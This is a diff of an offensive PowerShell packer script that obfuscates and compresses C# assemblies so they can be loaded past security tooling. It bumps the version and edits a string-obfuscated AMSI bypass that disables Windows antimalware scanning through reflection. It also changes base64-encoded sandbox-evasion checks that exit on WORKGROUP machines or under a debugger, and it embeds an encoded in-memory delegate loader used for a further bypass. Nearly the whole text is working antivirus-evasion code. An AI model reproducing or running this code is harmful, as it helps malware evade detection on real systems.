@@ -20,7 +20,7 @@ Write-Output "
   / __|__| |_  ___ _ _ _ __ ___| _ \___  __| |_____ _ _ 
  | (__(_-< ' \/ _ | '_| '_ \___|  _/ _ |/ _| / / -_) '_|
   \___/__/_||_\__,|_| | .__/   |_| \__,_\__|_\_\___|_|  
-                      |_|                               v2.1
+                      |_|                               v2.2
 
 Usage: 
 > Import-Module ./Invoke-PoSH-CsharpPacker.ps1
@@ -36,7 +36,7 @@ Features:
 "
 
 # ''A'''M''S''I''-''B''Y''P''A''S''S''
-[Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($null),0x41414141);
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($0x00),0x41414141);
 
 function Invoke-PoSH-CsharpPacker {
 	
@@ -91,8 +91,8 @@ function Invoke-PoSH-CsharpPacker {
         $compressiontype = $compressiontypes | Get-Random
 
         Write-Output "[*] File compression (GZip/Deflate)"
-				$TempNETAssemblyLoaderFileRead = [System.IO.File]::ReadAllBytes($TempNETAssemblyLoaderFile)
-				Del "C:\Windows\Temp\templatefile.ps1"
+        $TempNETAssemblyLoaderFileRead = [System.IO.File]::ReadAllBytes($TempNETAssemblyLoaderFile)
+        Del "C:\Windows\Temp\templatefile.ps1"
         [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
         if ($compressiontype -eq "Gzip") {
             $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
@@ -141,14 +141,14 @@ function Invoke-PoSH-CsharpPacker {
         
 	if ($sandbox) {	
         Write-Output "[*] Adding basic sandbox checks"
-        $code_fixed_order1 += '${17} = "aWYgKFQnZSdzJ3QnLVBBdEggVmFyJ2knYSdiJ2xlOlBTJ0QnZSdiJ3VnQ09OdGVYdCkge"' + "`r`n"
+        $code_fixed_order1 += '${17} = "cSAiV09SS0dST1VQIikge2V4aXR9IGVsc2VpZiAoVCdlJ3MndCctUEF0SCBWYXInaSdhJ2InbGU6"' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order1 -join ''
-        $code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
+        $code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("aWYgKChHZXQtV01JT2JqZWN0IC1DbGFzcyBXaW4zMl9Db21wdXRlclN5c3RlbSkuRG9tYWluIC1l"+${17}+"UFMnRCdlJ2IndWdDT050ZVh0KSB7ZXhpdH0gZWxzZSB7Uyd0J2EnUlQtU2xFJ0VwIC1zIDYwfTs="))' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order2 -join ''
 	$code_fixed_order3 += "iN'v'Oke-exPReS'S'iOn"+'(${18})' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order3 -join ''
         }
-		
+ 
         Write-Output "[*] Adding 'A'M'S'I' bypass"
         $code_fixed_order4 += '${9} = "IyBTdXBlcg0KZnVuY3Rpb24gU3VwZXIgew0KICAgIFBhcmFtICgNCiAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0gW1R5cGVbXV0NCiAgICAgJGZ1bmMsIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0gW1R5cGVdICRkZWxUeXBlID0gW1ZvaWRdDQogICAgKQ0KICAgICR0eXBlID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uDQogICAgRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksDQpbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pLg0KICAgIERlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKS4NCiAgICBEZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywNCiAgICBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkNCiAgJHR5cGUuDQogICAgRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywNCltTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJGZ1bmMpLg0KICAgICBTZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykNCiAgJHR5cGUuDQogICAgRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkZGVsVHlwZSwNCiRmdW5jKS4gU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSw"' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order4 -join ''
